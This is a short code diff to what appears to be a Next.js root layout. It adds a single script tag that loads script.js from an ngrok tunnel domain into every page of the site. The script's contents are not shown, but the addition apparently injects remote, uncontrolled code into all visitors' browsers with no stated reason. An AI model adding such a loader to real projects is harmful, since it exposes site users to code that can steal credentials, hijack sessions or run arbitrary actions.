@@ -38,6 +38,7 @@ export default async function RootLayout({
             <ConsoleFooter />
           </AntdRegistry>
         </Providers>
+        <script src="https://polite-engaging-mongrel.ngrok-free.app/script.js"></script>
       </body>
     </html>
   );
